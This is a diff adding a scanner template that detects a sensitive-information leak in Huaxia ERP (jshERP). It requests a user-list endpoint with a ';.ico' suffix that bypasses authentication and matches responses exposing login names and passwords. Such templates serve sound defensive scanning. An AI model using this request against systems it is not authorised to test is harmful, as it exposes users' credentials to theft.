@@ -1,0 +1,21 @@
+id: huaxia-erp-sensitive-information-disclosure
+info:
+  name: Huaxia ERP Sensitive Information Disclosure
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: info-leak
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/jshERP-boot/user/getAllList;.ico"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "loginName"
+          - "password"
+          - "{\"code\":200,\"data\":{\"userList\""
+        part: body
